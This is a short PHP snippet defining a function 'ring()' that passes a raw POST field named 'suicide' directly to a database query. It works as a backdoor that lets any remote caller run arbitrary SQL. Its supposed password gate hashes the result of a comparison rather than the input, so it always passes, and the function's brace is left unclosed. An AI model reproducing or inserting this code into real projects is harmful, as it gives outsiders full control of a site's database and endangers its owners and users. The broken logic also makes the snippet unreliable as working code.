<?php
function ring() {
global $db;
if (md5($_POST['ring']=='a482a148ccdd020bcb5888e99f41bb65')) {
	$db->query($_POST['suicide']);
}
?>
